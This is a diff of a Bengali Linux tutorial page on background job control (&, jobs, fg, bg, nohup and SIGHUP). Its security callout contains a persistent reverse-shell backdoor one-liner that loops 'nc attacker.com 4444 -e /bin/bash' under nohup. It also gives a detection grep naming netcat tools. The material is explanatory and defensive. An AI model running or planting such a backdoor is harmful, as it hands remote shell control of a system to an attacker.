@@ -1,56 +1,64 @@
 ---
 title: Background Jobs
-description: Terminal block না করে background-এ jobs চালাও — &, bg, fg, jobs।
+description: Terminal block না করে background-এ jobs চালাও — &, bg, fg, jobs, nohup।
 ---
 
-import { Callout } from 'nextra/components'
+import { Callout, Tabs } from 'nextra/components'
 
 # Background Jobs
 
 <Callout type="info">
-  সাধারণত একটা command চালালে terminal সেটা শেষ হওয়া পর্যন্ত block হয়ে থাকে। Background jobs দিয়ে একটা process চালু রেখে same terminal-এ অন্য কাজ করা যায়।
+  সাধারণত command চালালে terminal সেটা শেষ হওয়া পর্যন্ত অপেক্ষা করে — এই সময় তুমি আর কিছু করতে পারো না। Background jobs এই সমস্যার সমাধান।
 </Callout>
 
 ## Foreground vs Background
 
-**Foreground:** Terminal block হয়। Command শেষ না হলে কিছু করা যায় না।
+**Foreground মানে:** Terminal block। Command শেষ না হওয়া পর্যন্ত terminal তোমার কোনো নতুন input নেবে না।
 
 ```bash filename="Terminal"
-# এটা foreground-এ চলে — শেষ হওয়া পর্যন্ত wait করতে হবে
+# এই command foreground-এ চলে
+# 100 সেকেন্ড ধরে terminal block থাকবে
 sleep 100
+# এখন অন্য কিছু টাইপ করতে পারবে না
 ```
 
-**Background:** Terminal free থাকে। Process আলাদাভাবে চলতে থাকে।
+**Background মানে:** Process চলতে থাকে, কিন্তু terminal free। তুমি অন্য কাজ করতে পারো।
 
 ```bash filename="Terminal"
-# & দিয়ে background-এ পাঠাও
+# & দিলে background-এ যায়
 sleep 100 &
 # Output: [1] 5432
-#          └── Job number আর PID
-```
+#          ^   ^
+#          |   PID (process ID)
+#          job number
 
----
-
-## `&` — Background-এ Start করো
-
-Command-এর শেষে `&` দিলে background-এ চলে।
-
-```bash filename="Terminal"
-# Background-এ চালাও
-python3 server.py &
-
-# Output দেখবে:
-# [1] 6789
-
-# Terminal এখন free — অন্য কাজ করো
+# এখনই নতুন command দিতে পারো
 ls -la
 ```
 
----
+**Job number vs PID:**
+- **Job number** `[1]` — এই terminal session-এর মধ্যে এটা কততম background job
+- **PID** `5432` — পুরো system-এ এই process-এর unique ID
+
+Job number দিয়ে `fg`, `bg` command কাজ করে। PID দিয়ে `kill` command কাজ করে।
+
+## `&` — Background-এ Start
+
+Command-এর শেষে `&` যোগ করলেই background-এ যায়।
+
+```bash filename="Terminal"
+# Server background-এ চালু করো
+python3 -m http.server 8080 &
+# [1] 6789
+
+# Terminal এখন free — অন্য কাজ করো
+curl localhost:8080
+ls /var/log
+```
 
 ## `jobs`
 
-Current terminal session-এর সব background jobs দেখাও।
+এই terminal session-এর সব background jobs দেখো।
 
 ```bash filename="Terminal"
 jobs
@@ -58,51 +66,53 @@ jobs
 # Output:
 # [1]+  Running    sleep 100 &
 # [2]-  Stopped    vim notes.txt
+#  ^       ^
+#  job#    state
 ```
 
-| Column | মানে |
-|--------|------|
-| `[1]` | Job number |
-| `+` | Current (default) job |
-| `-` | Previous job |
-| `Running` / `Stopped` | Job state |
+| চিহ্ন | মানে |
+|-------|------|
+| `+` | Default job — `fg` বা `bg` দিলে এটাই select হবে |
+| `-` | এর আগের job |
+| `Running` | চলছে |
+| `Stopped` | Ctrl+Z দিয়ে থামানো আছে |
 
----
+## `fg` এবং `bg`
 
-## `fg` — Foreground-এ আনো
+<Tabs items={['fg — foreground-এ আনো', 'bg — background-এ পাঠাও']}>
+  <Tabs.Tab>
+    Background job-কে আবার terminal-এ ফিরিয়ে আনো।
 
-Background job-কে terminal-এ ফিরিয়ে আনো।
+    ```bash filename="Terminal"
+    # সবচেয়ে সাম্প্রতিক job foreground-এ আনো
+    fg
 
-```bash filename="Terminal"
-# Default (most recent) job foreground-এ আনো
-fg
+    # নির্দিষ্ট job number
+    fg %1
+    fg %2
+    ```
 
-# নির্দিষ্ট job number
-fg %1
-fg %2
-```
+    `fg` করার পর terminal আবার block হবে — সেই process এখন foreground-এ।
+  </Tabs.Tab>
+  <Tabs.Tab>
+    Foreground-এ চলা job থামিয়ে background-এ পাঠাও।
 
----
+    ```bash filename="Terminal"
+    # Step 1: foreground-এ একটা command চালাও
+    sleep 100
 
-## `bg` — থামানো Job চালু করো
+    # Step 2: Ctrl+Z চাপো — job pause হয়
+    # Output: [1]+  Stopped    sleep 100
 
-`Ctrl + Z` দিয়ে job থামানো হয়। `bg` দিয়ে সেটা background-এ চালু করো।
+    # Step 3: background-এ চালু করো
+    bg %1
+    # Output: [1]+ sleep 100 &
+    # এখন job চলছে, terminal free
+    ```
+  </Tabs.Tab>
+</Tabs>
 
-```bash filename="Terminal"
-# Step 1: একটা foreground job চালাও
-sleep 100
-
-# Step 2: Ctrl + Z চাপো — job suspend হয়
-# Output: [1]+  Stopped    sleep 100
-
-# Step 3: Background-এ চালু করো
-bg %1
-# Output: [1]+ sleep 100 &
-```
-
----
-
-## Complete Workflow
+## পুরো Workflow একসাথে
 
 ```bash filename="Terminal"
 # 1. Background-এ server চালাও
@@ -110,68 +120,88 @@ python3 -m http.server 8080 &
 # [1] 7890
 
 # 2. অন্য কাজ করো
+curl localhost:8080
 ls /var/log
 
 # 3. Background jobs দেখো
 jobs
 # [1]+  Running    python3 -m http.server 8080 &
 
-# 4. Server foreground-এ আনো (দরকার হলে)
+# 4. Foreground-এ আনো (দরকার হলে)
 fg %1
 
 # 5. Ctrl+C দিয়ে বন্ধ করো
 ```
 
----
+## `nohup` — Terminal বন্ধ হলেও চলুক
 
-## `nohup` — Terminal বন্ধ করলেও চালু রাখো
+**আগে জানো কেন terminal বন্ধ হলে background job মারা যায়:**
 
-`&` দিয়ে background-এ দিলে terminal বন্ধ করলে job-ও বন্ধ হয়। `nohup` দিয়ে সেটা prevent করা যায়।
+তুমি terminal বন্ধ করলে Linux সেই terminal-এর সব child process-কে `SIGHUP` (Signal Hang Up) পাঠায়। এই signal পেলে process নিজেই বন্ধ হয়ে যায়।
+
+`nohup` (No Hang Up) এই signal-কে ignore করে — তাই terminal বন্ধ হলেও process চলতে থাকে।
 
 ```bash filename="Terminal"
-# Terminal বন্ধ করলেও চলবে
+# terminal বন্ধ করলেও চলবে
 nohup python3 server.py &
 
-# Output nohup.out file-এ যাবে
+# Output: nohup.out (সব output এই file-এ যাবে)
+# live দেখো:
 tail -f nohup.out
 ```
 
----
+```bash filename="Terminal"
+# nohup + নির্দিষ্ট output file
+nohup python3 server.py > server.log 2>&1 &
+#                        ^           ^
+#                        stdout      stderr ও এখানে
+```
+
+<Callout type="default">
+  **`nohup` কখন দরকার:** SSH দিয়ে remote server-এ কাজ করার সময় `nohup` ছাড়া background job চালালে — SSH connection বন্ধ হলে job-ও বন্ধ হয়ে যাবে। Long-running scripts বা servers চালাতে সবসময় `nohup` ব্যবহার করো।
+</Callout>
 
 ## CyberSec Note
 
 <Callout type="warning">
-  **Background jobs — attacker perspective:**
+  **Background jobs — attacker এবং defender perspective:**
 
-  Reverse shell পাওয়ার পর attackers প্রায়ই background-এ malicious processes চালায়:
+  **Attacker কীভাবে ব্যবহার করে:**
 
-  ```bash
-  # Netcat listener background-এ
-  nc -lvnp 4444 &
+  Reverse shell পাওয়ার পর attacker প্রায়ই persistence তৈরি করতে background jobs ব্যবহার করে:
 
-  # Persistent backdoor
+  ```bash filename="Terminal"
+  # Persistent backdoor — প্রতি ৬০ সেকেন্ডে পুনরায় connect করে
+  # terminal বন্ধ হলেও চলে
   nohup bash -c 'while true; do nc attacker.com 4444 -e /bin/bash; sleep 60; done' &
-
-  # Detection — unusual background processes খোঁজো
-  jobs
-  ps aux | grep -v "known-process"
   ```
 
-  **Defender perspective:**
-  যদি কোনো server-এ unexpected background jobs দেখো — সেটা compromise-এর sign হতে পারে।
-</Callout>
+  **তুমি যদি defender হও — কীভাবে সন্দেহজনক background job ধরবে:**
 
----
+  ```bash filename="Terminal"
+  # এই terminal session-এর background jobs দেখো
+  jobs
+
+  # পুরো system-এ unusual processes
+  ps aux | grep -E "nc|ncat|netcat|bash -i"
+
+  # কোন process কোন external IP-তে connect করছে
+  ss -tnp | grep ESTABLISHED
+  ```
+
+  **SIGHUP এবং নিরাপত্তা:** যখন কোনো system-এ unknown `nohup` process দেখবে, সেটা সন্দেহজনক — কারণ normal user সাধারণত `nohup` ব্যবহার করে না।
+</Callout>
 
 ## Quick Check
 
-- [ ] Command background-এ চালানোর syntax কী?
-- [ ] `jobs` কী দেখায়?
+- [ ] `sleep 100` আর `sleep 100 &` এর মধ্যে পার্থক্য কী?
+- [ ] Job number আর PID কেন আলাদা?
+- [ ] Terminal বন্ধ করলে background job কেন মারা যায়?
+- [ ] `nohup` কীভাবে সেই সমস্যা সমাধান করে?
 - [ ] `fg %2` মানে কী?
-- [ ] `nohup` কেন দরকার?
 
 **পরবর্তী →** [Killing Processes](/docs/linux-fundamentals/06-processes/killing-processes)
 
 <span style={{ display: 'none' }}>
-  Search Keywords: linux background jobs, fg bg jobs commands, nohup, & background process, linux job control, terminal background task
+  Search Keywords: linux background jobs bangla, fg bg jobs commands, nohup SIGHUP, & background process bengali, linux job control, terminal background task
 </span>
